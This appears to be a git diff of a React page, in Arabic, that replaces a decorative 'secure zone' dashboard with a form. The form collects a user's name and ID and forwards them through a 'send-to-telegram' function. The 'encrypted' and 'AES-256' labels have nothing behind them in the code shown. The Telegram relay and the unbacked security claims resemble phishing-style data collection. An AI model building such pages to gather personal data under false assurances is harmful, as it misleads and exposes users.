@@ -1,16 +1,28 @@
 import { useState, useEffect } from 'react';
 import { useSearchParams, useNavigate } from 'react-router-dom';
 import { validateToken, storeSessionToken, hasValidSession, clearSession } from '@/lib/tokenUtils';
-import { ShieldCheck, ShieldX, Loader2, Lock, Unlock, Home, LogOut, Server, Database, Wifi, Activity } from 'lucide-react';
+import { supabase } from '@/integrations/supabase/client';
+import { ShieldCheck, ShieldX, Loader2, Lock, Home, LogOut, User, IdCard, Send } from 'lucide-react';
 import { Button } from '@/components/ui/button';
+import { Input } from '@/components/ui/input';
+import { Label } from '@/components/ui/label';
+import { useToast } from '@/hooks/use-toast';
 
 type AccessState = 'validating' | 'granted' | 'denied' | 'expired';
 
 const SecurePage = () => {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
+  const { toast } = useToast();
+  
   const [accessState, setAccessState] = useState<AccessState>('validating');
   const [validationMessage, setValidationMessage] = useState<string>('');
+  
+  // Form state
+  const [name, setName] = useState('');
+  const [userId, setUserId] = useState('');
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isSubmitted, setIsSubmitted] = useState(false);
 
   useEffect(() => {
     // Check if user already has a valid session
@@ -44,6 +56,44 @@ const SecurePage = () => {
 
     return () => clearTimeout(validationTimer);
   }, [searchParams]);
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    
+    if (!name.trim() || !userId.trim()) {
+      toast({
+        title: "خطأ",
+        description: "يرجى ملء جميع الحقول",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    setIsSubmitting(true);
+
+    try {
+      const { data, error } = await supabase.functions.invoke('send-to-telegram', {
+        body: { name: name.trim(), id: userId.trim() }
+      });
+
+      if (error) throw error;
+
+      setIsSubmitted(true);
+      toast({
+        title: "تم بنجاح",
+        description: "تم إرسال البيانات بنجاح",
+      });
+    } catch (error) {
+      console.error('Error submitting form:', error);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء إرسال البيانات",
+        variant: "destructive",
+      });
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   const handleLogout = () => {
     clearSession();
@@ -112,7 +162,7 @@ const SecurePage = () => {
     );
   }
 
-  // Granted state - Main secure content
+  // Granted state - Form
   return (
     <div className="min-h-screen bg-background cyber-grid">
       {/* Header */}
@@ -139,101 +189,114 @@ const SecurePage = () => {
       </header>
 
       {/* Main Content */}
-      <main className="container mx-auto px-4 py-8">
-        {/* Welcome Banner */}
-        <div className="bg-gradient-to-r from-primary/10 via-secondary/10 to-primary/10 border border-primary/30 rounded-2xl p-8 mb-8 box-glow">
-          <div className="flex items-center gap-4 mb-4">
-            <Unlock className="w-12 h-12 text-primary" />
-            <div>
-              <h2 className="font-display text-2xl md:text-3xl text-glow" dir="rtl">
-                مرحباً بك في المنطقة الآمنة
-              </h2>
-              <p className="text-muted-foreground font-mono text-sm">
-                تم التحقق من هويتك بنجاح
-              </p>
+      <main className="container mx-auto px-4 py-8 flex items-center justify-center min-h-[calc(100vh-80px)]">
+        {isSubmitted ? (
+          // Success state
+          <div className="text-center max-w-md">
+            <div className="relative mb-8">
+              <div className="absolute inset-0 bg-cyber-green/30 rounded-full blur-xl animate-pulse" />
+              <ShieldCheck className="w-24 h-24 text-primary relative mx-auto" />
             </div>
-          </div>
-          
-          <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-6">
-            <div className="bg-muted/50 rounded-lg p-3 text-center">
-              <Lock className="w-6 h-6 text-primary mx-auto mb-2" />
-              <p className="text-xs text-muted-foreground">مشفر</p>
-            </div>
-            <div className="bg-muted/50 rounded-lg p-3 text-center">
-              <Wifi className="w-6 h-6 text-primary mx-auto mb-2" />
-              <p className="text-xs text-muted-foreground">متصل</p>
-            </div>
-            <div className="bg-muted/50 rounded-lg p-3 text-center">
-              <Activity className="w-6 h-6 text-primary mx-auto mb-2" />
-              <p className="text-xs text-muted-foreground">نشط</p>
-            </div>
-            <div className="bg-muted/50 rounded-lg p-3 text-center">
-              <ShieldCheck className="w-6 h-6 text-primary mx-auto mb-2" />
-              <p className="text-xs text-muted-foreground">آمن</p>
-            </div>
-          </div>
-        </div>
-
-        {/* Content Cards */}
-        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
-          {/* Card 1 */}
-          <div className="bg-card border border-border rounded-xl p-6 hover:box-glow transition-all duration-300">
-            <Server className="w-10 h-10 text-primary mb-4" />
-            <h3 className="font-display text-lg mb-2">الخادم الآمن</h3>
-            <p className="text-sm text-muted-foreground" dir="rtl">
-              جميع البيانات محمية بتشفير من الدرجة العسكرية
+            <h2 className="font-display text-3xl text-glow mb-4">تم بنجاح!</h2>
+            <p className="text-muted-foreground mb-6" dir="rtl">
+              تم إرسال بياناتك بنجاح. شكراً لك.
             </p>
-            <div className="mt-4 flex items-center gap-2">
-              <span className="w-2 h-2 rounded-full bg-cyber-green animate-pulse" />
-              <span className="text-xs text-primary font-mono">ONLINE</span>
-            </div>
+            <Button onClick={handleLogout} variant="outline" className="gap-2">
+              <Home className="w-4 h-4" />
+              العودة للرئيسية
+            </Button>
           </div>
+        ) : (
+          // Form
+          <div className="w-full max-w-md">
+            {/* Form Card */}
+            <div className="relative">
+              <div className="absolute -inset-4 bg-gradient-to-r from-primary/20 via-secondary/20 to-primary/20 rounded-3xl blur-xl opacity-50" />
+              
+              <div className="relative bg-card border border-primary/30 rounded-2xl p-8 box-glow">
+                {/* Header */}
+                <div className="text-center mb-8">
+                  <div className="w-16 h-16 bg-primary/20 rounded-full flex items-center justify-center mx-auto mb-4 box-glow">
+                    <Lock className="w-8 h-8 text-primary" />
+                  </div>
+                  <h2 className="font-display text-2xl text-glow mb-2">تسجيل البيانات</h2>
+                  <p className="text-sm text-muted-foreground" dir="rtl">
+                    أدخل بياناتك للمتابعة
+                  </p>
+                </div>
 
-          {/* Card 2 */}
-          <div className="bg-card border border-border rounded-xl p-6 hover:box-glow transition-all duration-300">
-            <Database className="w-10 h-10 text-primary mb-4" />
-            <h3 className="font-display text-lg mb-2">قاعدة البيانات</h3>
-            <p className="text-sm text-muted-foreground" dir="rtl">
-              تخزين آمن لجميع المعلومات الحساسة
-            </p>
-            <div className="mt-4 flex items-center gap-2">
-              <span className="w-2 h-2 rounded-full bg-cyber-green animate-pulse" />
-              <span className="text-xs text-primary font-mono">SYNCED</span>
-            </div>
-          </div>
+                {/* Form */}
+                <form onSubmit={handleSubmit} className="space-y-6">
+                  {/* Name Field */}
+                  <div className="space-y-2">
+                    <Label htmlFor="name" className="flex items-center gap-2 text-foreground">
+                      <User className="w-4 h-4 text-primary" />
+                      الاسم
+                    </Label>
+                    <Input
+                      id="name"
+                      type="text"
+                      placeholder="أدخل اسمك"
+                      value={name}
+                      onChange={(e) => setName(e.target.value)}
+                      className="bg-muted/50 border-border focus:border-primary focus:ring-primary/50"
+                      dir="rtl"
+                      maxLength={100}
+                      required
+                    />
+                  </div>
 
-          {/* Card 3 */}
-          <div className="bg-card border border-border rounded-xl p-6 hover:box-glow transition-all duration-300">
-            <Activity className="w-10 h-10 text-primary mb-4" />
-            <h3 className="font-display text-lg mb-2">المراقبة الحية</h3>
-            <p className="text-sm text-muted-foreground" dir="rtl">
-              تتبع جميع الأنشطة في الوقت الفعلي
-            </p>
-            <div className="mt-4 flex items-center gap-2">
-              <span className="w-2 h-2 rounded-full bg-cyber-green animate-pulse" />
-              <span className="text-xs text-primary font-mono">MONITORING</span>
-            </div>
-          </div>
-        </div>
+                  {/* ID Field */}
+                  <div className="space-y-2">
+                    <Label htmlFor="userId" className="flex items-center gap-2 text-foreground">
+                      <IdCard className="w-4 h-4 text-primary" />
+                      ID
+                    </Label>
+                    <Input
+                      id="userId"
+                      type="text"
+                      placeholder="أدخل الـ ID الخاص بك"
+                      value={userId}
+                      onChange={(e) => setUserId(e.target.value)}
+                      className="bg-muted/50 border-border focus:border-primary focus:ring-primary/50"
+                      dir="rtl"
+                      maxLength={50}
+                      required
+                    />
+                  </div>
 
-        {/* Session Info */}
-        <div className="mt-8 bg-muted/30 border border-border rounded-lg p-4">
-          <h4 className="font-mono text-sm text-primary mb-3">معلومات الجلسة</h4>
-          <div className="grid md:grid-cols-3 gap-4 text-xs font-mono">
-            <div>
-              <span className="text-muted-foreground">STATUS:</span>
-              <span className="text-primary ml-2">AUTHENTICATED</span>
-            </div>
-            <div>
-              <span className="text-muted-foreground">ENCRYPTION:</span>
-              <span className="text-primary ml-2">AES-256</span>
-            </div>
-            <div>
-              <span className="text-muted-foreground">SESSION:</span>
-              <span className="text-primary ml-2">ACTIVE</span>
+                  {/* Submit Button */}
+                  <Button
+                    type="submit"
+                    className="w-full gap-2"
+                    disabled={isSubmitting}
+                    variant="cyber"
+                  >
+                    {isSubmitting ? (
+                      <>
+                        <Loader2 className="w-4 h-4 animate-spin" />
+                        جاري الإرسال...
+                      </>
+                    ) : (
+                      <>
+                        <Send className="w-4 h-4" />
+                        إرسال
+                      </>
+                    )}
+                  </Button>
+                </form>
+
+                {/* Security Notice */}
+                <div className="mt-6 pt-6 border-t border-border">
+                  <div className="flex items-center gap-2 text-xs text-muted-foreground">
+                    <span className="w-2 h-2 rounded-full bg-cyber-green animate-pulse" />
+                    <span className="font-mono">ENCRYPTED CONNECTION • SECURE</span>
+                  </div>
+                </div>
+              </div>
             </div>
           </div>
-        </div>
+        )}
       </main>
 
       {/* Footer Status */}
@@ -244,7 +307,7 @@ const SecurePage = () => {
             SECURE CONNECTION
           </span>
           <span className="text-muted-foreground">|</span>
-          <span className="text-muted-foreground">يمكنك التصفح بحرية</span>
+          <span className="text-muted-foreground">AES-256 ENCRYPTION</span>
         </div>
       </footer>
     </div>
